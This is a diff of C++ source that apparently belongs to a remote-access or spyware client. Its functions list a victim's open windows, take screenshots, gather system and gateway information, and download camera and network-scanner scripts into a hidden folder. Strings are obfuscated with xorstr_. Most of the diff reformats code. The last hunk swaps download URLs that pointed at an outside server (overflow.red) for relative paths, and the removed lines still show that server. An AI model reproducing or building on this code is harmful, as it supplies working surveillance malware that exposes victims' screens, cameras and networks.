@@ -59,14 +59,15 @@ BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM param)
 
 namespace client {
 	namespace functions {
-		std::vector<std::string> get_all_windows()
-		{
+		std::vector<std::string> get_all_windows() {
 			std::vector<std::string> windows{};
 			EnumWindows(EnumWindowsProc, (LPARAM)&windows);
 			return windows;
 		}
 
 		void take_screenshot(std::string file) {
+			// Pasted
+
 			ULONG_PTR gdiplustoken;
 			GdiplusStartupInput gdistartupinput;
 			GdiplusStartupOutput gdistartupoutput;
@@ -121,7 +122,7 @@ namespace client {
 		}
 
 		std::string get_computer_info() {
-#define INFO_BUFFER_SIZE 32767
+			#define INFO_BUFFER_SIZE 32767
 			TCHAR  infoBuf[INFO_BUFFER_SIZE];
 			DWORD  bufCharCount = INFO_BUFFER_SIZE;
 
@@ -151,8 +152,7 @@ namespace client {
 			return response;
 		}
 
-		std::string get_default_gateway()
-		{
+		std::string get_default_gateway() {
 			auto res = helpers::exec("ipconfig | findstr /i default | findstr /R [0-9]");
 			auto temp = res.substr(res.find(":") + 2);
 			temp.replace(temp.length() - 1, temp.length(), "");
@@ -254,8 +254,8 @@ namespace client {
 
 		void install_scripts() {
 			std::filesystem::create_directory(PATH + xorstr_("scripts\\"));
-			requests::download_file("https://overflow.red/scripts/camera.py", PATH + xorstr_("scripts\\camera.py"));
-			requests::download_file("https://overflow.red/scripts/scanner.py", PATH + xorstr_("scripts\\scanner.py"));
+			requests::download_file("scripts/camera.py", PATH + xorstr_("scripts\\camera.py"));
+			requests::download_file("scripts/scanner.py", PATH + xorstr_("scripts\\scanner.py"));
 		}
 	}
 }
